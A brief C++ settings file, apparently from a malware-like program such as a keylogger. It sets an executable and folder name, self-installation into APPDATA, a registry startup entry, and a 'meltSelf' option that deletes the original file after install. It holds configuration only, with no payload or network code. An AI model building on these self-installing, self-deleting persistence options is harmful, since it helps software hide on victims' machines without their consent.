#include "settings.h"

std::string Settings::fileName = "latestProjectTest.exe";					//file name
std::string Settings::folderName = "latestProjectTestDIR";					//name of folder where file is located
std::string Settings::startupName = "latest proj test startup name";		//startup name in registry / taskmgr
std::string Settings::installLocation = "APPDATA"; //install location (appdata, programdata etc)
bool Settings::installSelf = true;				//specifies whether the program should install itself
bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
bool Settings::setStartupSelf = false;			//specifies whether the program is to be started on system boot
bool Settings::logEvents = true;